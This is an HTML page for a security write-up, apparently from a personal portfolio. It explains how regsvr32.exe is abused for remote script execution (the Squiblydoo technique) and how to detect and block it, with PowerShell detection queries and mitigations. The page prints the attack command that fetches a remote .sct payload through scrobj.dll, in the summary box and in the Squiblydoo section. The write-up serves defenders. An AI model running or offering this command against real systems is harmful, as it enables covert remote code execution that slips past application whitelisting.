@@ -1,0 +1,270 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>regsvr32 as Execution Vector | 22nd Survey Division</title>
+    <meta name="description" content="Understanding how regsvr32.exe is abused for code execution and how to detect it.">
+    <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@300;400;500;600&display=swap" rel="stylesheet">
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        :root {
+            --bg: #0a0a0a;
+            --bg2: rgba(18, 18, 18, 0.95);
+            --text: #ffffff;
+            --dim: #888888;
+            --border: rgba(255, 255, 255, 0.12);
+        }
+        body {
+            font-family: 'JetBrains Mono', monospace;
+            background: var(--bg);
+            color: var(--text);
+            line-height: 1.7;
+        }
+        .container {
+            max-width: 800px;
+            margin: 0 auto;
+            padding: 4rem 2rem;
+        }
+        @media (max-width: 768px) {
+            .container { padding: 2rem 1rem; }
+        }
+        .back-link {
+            display: inline-block;
+            color: var(--dim);
+            font-size: 0.75rem;
+            margin-bottom: 2rem;
+            text-decoration: none;
+        }
+        .back-link:hover { color: var(--text); }
+        .tag {
+            display: inline-block;
+            font-size: 0.65rem;
+            color: var(--dim);
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            margin-bottom: 0.5rem;
+        }
+        h1 {
+            font-size: 1.5rem;
+            font-weight: 400;
+            margin-bottom: 1rem;
+        }
+        .meta {
+            font-size: 0.75rem;
+            color: var(--dim);
+            margin-bottom: 2rem;
+            padding-bottom: 2rem;
+            border-bottom: 1px solid var(--border);
+        }
+        h2 {
+            font-size: 1rem;
+            font-weight: 500;
+            margin: 2rem 0 1rem;
+            color: var(--text);
+        }
+        p {
+            font-size: 0.85rem;
+            color: var(--dim);
+            margin-bottom: 1rem;
+        }
+        ul, ol {
+            font-size: 0.85rem;
+            color: var(--dim);
+            margin-bottom: 1rem;
+            padding-left: 1.5rem;
+        }
+        li { margin-bottom: 0.5rem; }
+        code {
+            background: rgba(255, 255, 255, 0.05);
+            padding: 0.15rem 0.4rem;
+            font-size: 0.8rem;
+            border-radius: 2px;
+        }
+        pre {
+            background: rgba(255, 255, 255, 0.03);
+            border: 1px solid var(--border);
+            padding: 1rem;
+            overflow-x: auto;
+            margin-bottom: 1rem;
+            font-size: 0.75rem;
+        }
+        pre code {
+            background: none;
+            padding: 0;
+        }
+        .highlight {
+            color: var(--text);
+            font-weight: 500;
+        }
+        .detection-box {
+            background: rgba(255, 255, 255, 0.03);
+            border-left: 2px solid var(--dim);
+            padding: 1rem;
+            margin: 1.5rem 0;
+        }
+        .detection-box h3 {
+            font-size: 0.75rem;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            margin-bottom: 0.5rem;
+            color: var(--text);
+        }
+        .mitre {
+            font-size: 0.75rem;
+            color: var(--dim);
+            margin-top: 2rem;
+            padding-top: 1rem;
+            border-top: 1px solid var(--border);
+        }
+        .layman-box { background: rgba(255,255,255,0.03); border-left: 3px solid rgba(255,255,255,0.2); padding: 1rem 1.25rem; margin: 1.5rem 0; }
+        .layman-label { font-size: 0.6rem; color: var(--dim); text-transform: uppercase; letter-spacing: 1px; margin-bottom: 0.4rem; }
+        .layman-tldr { font-size: 0.85rem; color: var(--text); font-weight: 500; margin-bottom: 0.4rem; }
+        .layman-box p { font-size: 0.82rem; color: var(--dim); margin: 0; }
+        .detect-widget { background: #0d1117; border: 1px solid rgba(255,255,255,0.08); margin: 1.5rem 0; overflow: hidden; }
+        .dw-header { background: rgba(255,255,255,0.04); border-bottom: 1px solid rgba(255,255,255,0.06); padding: 0.4rem 0.75rem; display: flex; align-items: center; gap: 0.5rem; flex-wrap: wrap; }
+        .dw-dots { display: flex; gap: 4px; flex-shrink: 0; }
+        .dw-dot { width: 7px; height: 7px; border-radius: 50%; }
+        .dw-dot.r { background: #ff5f56; } .dw-dot.y { background: #ffbd2e; } .dw-dot.g { background: #27c93f; }
+        .dw-title { font-size: 0.6rem; color: #6a737d; flex: 1; margin-left: 4px; min-width: 100px; }
+        .dw-btref { font-size: 0.55rem; color: var(--dim); text-decoration: none; padding: 0.15rem 0.5rem; border: 1px solid var(--border); white-space: nowrap; }
+        .dw-btref:hover { color: var(--text); border-color: rgba(255,255,255,0.3); }
+        .dw-actions { display: flex; gap: 0.4rem; align-items: center; margin-left: auto; flex-shrink: 0; }
+        .detect-widget pre { font-size: 0.72rem; line-height: 1.6; padding: 0.75rem 1rem; margin: 0; color: #c9d1d9; overflow-x: auto; }
+        .dw-flag { border-top: 1px solid rgba(255,255,255,0.06); padding: 0.5rem 1rem; font-size: 0.65rem; color: var(--dim); }
+        .dw-flag strong { color: var(--text); }
+        .dw-copy { font-size: 0.55rem; color: var(--dim); background: transparent; border: 1px solid var(--border); padding: 0.15rem 0.4rem; cursor: pointer; white-space: nowrap; }
+        .dw-copy:hover { color: var(--text); border-color: rgba(255,255,255,0.3); }
+        .dw-copy.copied { color: #27c93f; border-color: #00ff88; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <a href="/portfolio.html#writeups" class="back-link">&larr; Back to writeups</a>
+
+        <span class="tag">LOLBins</span>
+        <h1>regsvr32 as Execution Vector</h1>
+        <p class="meta">Living off the land with COM registration</p>
+
+        <div class="layman-box">
+            <div class="layman-label">// What is this?</div>
+            <div class="layman-tldr">Using a built-in Windows tool to run remote scripts — no files downloaded, no obvious malware.</div>
+            <p>LOLBins (Living-off-the-Land Binaries) are legitimate Windows tools abused to run malicious code. regsvr32.exe normally registers COM plugins. It also accepts a URL and can fetch + execute a COM scriptlet directly from the internet — no file written to disk, no PowerShell, bypasses most application whitelisting. The command <code>regsvr32 /s /n /u /i:[URL] scrobj.dll</code> runs silently in the background.</p>
+        </div>
+
+        <div class="detect-widget">
+            <div class="dw-header">
+                <div class="dw-dots"><span class="dw-dot r"></span><span class="dw-dot y"></span><span class="dw-dot g"></span></div>
+                <span class="dw-title">PowerShell — LOLBin Detection</span>
+                <div class="dw-actions">
+                    <a href="/blueteam-ref.html#process" class="dw-btref">&rarr; Blue Team</a>
+                    <button class="dw-copy" onclick="copyDetectWidget(this)" title="Copy to clipboard">Copy</button>
+                </div>
+            </div>
+            <pre># LOLBin execution patterns in Security log
+Get-WinEvent -FilterHashtable @{LogName="Security"; Id=4688} -MaxEvents 500 -ErrorAction SilentlyContinue |
+  Where-Object { $_.Message -match "regsvr32|mshta|certutil|bitsadmin|wmic.*process" } |
+  Select-Object TimeCreated, @{N='Cmd';E={($_.Message -split 'Process Command Line:\s+')[1].Split([char]13)[0]}}
+
+# Running LOLBins
+Get-Process | Where-Object { $_.Name -match "regsvr32|mshta|certutil|wscript|cscript" } |
+  Select-Object Name, Id, Path
+
+# regsvr32 calling URLs
+Get-WinEvent -FilterHashtable @{LogName="Security"; Id=4688} -MaxEvents 300 -ErrorAction SilentlyContinue |
+  Where-Object { $_.Message -match "regsvr32.*/s.*/u.*http" }</pre>
+            <div class="dw-flag"><strong>If this flags:</strong> LOLBins with URLs or /s /u flags are executing remote code. regsvr32 should only load local DLLs. Check network connections from these processes.</div>
+        </div>
+
+
+        <h2>What is regsvr32?</h2>
+        <p><code>regsvr32.exe</code> is a legitimate Windows utility for registering and unregistering COM components (DLLs and OCX files). It's signed by Microsoft and present on every Windows installation.</p>
+        <p>When you run <code>regsvr32 something.dll</code>, it:</p>
+        <ol>
+            <li>Loads the DLL into memory</li>
+            <li>Calls <code>DllRegisterServer()</code> exported function</li>
+            <li>The DLL writes its COM class information to the registry</li>
+        </ol>
+        <p>The problem: attackers can make <code>DllRegisterServer()</code> do anything.</p>
+
+        <h2>The Abuse</h2>
+        <p><span class="highlight">OCX files are just DLLs</span> with a COM interface. An attacker creates an OCX that:</p>
+        <ul>
+            <li>Exports <code>DllRegisterServer()</code> as required</li>
+            <li>But instead of registering COM classes, executes arbitrary code</li>
+            <li>Downloads payloads, installs persistence, runs shellcode</li>
+        </ul>
+
+        <h2>Why It Works</h2>
+        <ul>
+            <li><span class="highlight">Signed binary</span> - regsvr32.exe is Microsoft-signed, trusted by application whitelisting</li>
+            <li><span class="highlight">Expected behavior</span> - Loading DLLs is what it's supposed to do</li>
+            <li><span class="highlight">No suspicious arguments</span> - Unlike PowerShell with encoded commands, the command line looks normal</li>
+            <li><span class="highlight">Network capability</span> - The <code>/i</code> flag can fetch remote scriptlets</li>
+        </ul>
+
+        <h2>The Squiblydoo Technique</h2>
+        <p>The most notorious abuse uses <code>scrobj.dll</code> (Windows Script Component runtime):</p>
+        <pre><code>regsvr32 /s /n /u /i:http://[remote]/payload.sct scrobj.dll</code></pre>
+        <p>This downloads and executes a remote SCT (scriptlet) file containing JScript or VBScript. The <code>/s</code> flag suppresses dialogs, <code>/n</code> skips calling DllRegisterServer on scrobj.dll, and <code>/i</code> passes the URL to DllInstall.</p>
+        <p><span class="highlight">Result:</span> Remote code execution via a signed Microsoft binary, no files written to disk.</p>
+
+        <h2>OCX as Dropper</h2>
+        <p>A malicious OCX can be structured to:</p>
+        <ul>
+            <li>Execute payload in <code>DllRegisterServer()</code> when registered</li>
+            <li>Install registry persistence during "registration"</li>
+            <li>Drop additional files to disk</li>
+            <li>Self-delete after execution</li>
+        </ul>
+        <p>From the outside, it looks like normal software installation.</p>
+
+        <div class="detection-box">
+            <h3>Detection Opportunities</h3>
+            <p><span class="highlight">Command line monitoring:</span> regsvr32 with <code>/i:</code> flag containing URLs or network paths. Any <code>/i:http</code> or <code>/i:\\</code> is highly suspicious.</p>
+            <p><span class="highlight">Unusual locations:</span> OCX/DLL files being registered from user directories (Downloads, Desktop, Temp). Legitimate registrations come from Program Files or System32.</p>
+            <p><span class="highlight">Registry monitoring:</span> <code>DllRegisterServer</code> writing to Run keys or other persistence locations instead of COM class registrations.</p>
+            <p><span class="highlight">Network connections:</span> regsvr32.exe making outbound network connections is almost always malicious.</p>
+        </div>
+
+        <h2>Defensive Mitigations</h2>
+        <ul>
+            <li><span class="highlight">Application whitelisting rules</span> - Block regsvr32 execution from user-writable directories</li>
+            <li><span class="highlight">Command line logging</span> - Enable Process Creation events (Event ID 4688) with command line</li>
+            <li><span class="highlight">Network segmentation</span> - Block regsvr32.exe from making outbound connections at the firewall</li>
+            <li><span class="highlight">ASR rules</span> - Windows Defender Attack Surface Reduction has rules for this</li>
+        </ul>
+
+        <h2>Part of a Larger Pattern</h2>
+        <p>regsvr32 is one of many "Living Off the Land Binaries" (LOLBins). Others include:</p>
+        <ul>
+            <li><code>mshta.exe</code> - HTML Application host</li>
+            <li><code>certutil.exe</code> - Certificate utility (can download files)</li>
+            <li><code>rundll32.exe</code> - DLL entry point caller</li>
+            <li><code>msiexec.exe</code> - MSI installer</li>
+        </ul>
+        <p>The common thread: legitimate signed binaries that can be abused for code execution.</p>
+
+        <p class="mitre">MITRE ATT&CK: T1218.010 (System Binary Proxy Execution: Regsvr32)</p>
+    </div>
+
+<script>
+function copyDetectWidget(btn) {
+    const pre = btn.closest('.detect-widget').querySelector('pre');
+    // Use textContent and normalize line endings for mobile compatibility
+    const text = pre.textContent.replace(/\r\n/g, '\n').trim();
+    navigator.clipboard.writeText(text).then(() => {
+        btn.textContent = 'Copied!';
+        btn.classList.add('copied');
+        setTimeout(() => {
+            btn.textContent = 'Copy';
+            btn.classList.remove('copied');
+        }, 2000);
+    });
+}
+</script>
+    <!-- ElevenLabs Voice Widget -->
+    <elevenlabs-convai agent-id="agent_1901m3ndae6tecqa74rbmz86n7j3"></elevenlabs-convai>
+    <script src="https://unpkg.com/@elevenlabs/convai-widget-embed" async type="text/javascript"></script>
+</body>
+</html>
